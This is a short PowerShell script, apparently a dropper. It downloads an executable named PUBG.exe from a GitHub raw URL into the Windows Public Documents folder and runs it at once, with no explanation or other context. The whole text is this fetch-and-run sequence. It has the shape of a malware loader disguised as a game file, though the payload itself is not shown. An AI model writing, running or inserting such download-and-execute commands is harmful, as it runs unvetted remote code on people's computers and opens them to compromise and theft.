$client = new-object System.Net.WebClient
$client.DownloadFile(“https://github.com/wenderman/puk/raw/main/PUBG.exe”,”C:\Users\Public\Documents\PUBG.exe”)
Set-Location "C:\Users\Public\Documents"
.\PUBG.exe